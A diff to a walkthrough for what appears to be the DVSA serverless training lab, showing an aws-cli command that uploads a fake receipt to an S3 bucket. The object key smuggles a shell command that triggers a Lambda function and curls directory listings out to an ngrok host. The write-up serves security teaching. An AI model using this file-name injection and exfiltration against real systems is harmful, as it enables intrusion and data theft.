@@ -23,7 +23,7 @@ You can notice that the path to the file in the bucket is the date. e.g. `2018/1
 2. So let's fake a receipt and see what happens. Using the aws-cli we can simply run the command:
 
 ```
-aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;curl 0c971764.ngrok.io?data="$(ls)";echo x.raw' --profile hacker
+aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;curl 0c971764.ngrok.io?data="$(ls)";echo x.raw' --acl public-read --profile hacker
 ```
 (The *echo x.raw* at the end of the file name is used to trigger the function, which is only triggered when a .raw file is created).
 
